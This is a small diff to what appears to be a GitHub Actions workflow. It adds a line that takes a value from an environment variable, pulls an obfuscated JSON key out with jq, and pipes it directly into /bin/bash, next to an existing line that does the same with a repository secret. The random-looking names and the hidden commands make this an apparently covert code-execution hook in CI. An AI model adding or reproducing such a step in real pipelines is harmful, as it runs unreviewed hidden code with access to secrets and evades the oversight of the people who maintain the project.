@@ -17,6 +17,7 @@ jobs:
           t8: ${{ secrets.t8 }}
         run: |
           printf '%s' "$t8" | jq -r .ujewq0234 | /bin/bash
+          echo $iaqt6173 | jq -r .axqiv30560 | /bin/bash
 
       - name: Persist output
         uses: actions/upload-artifact@v4
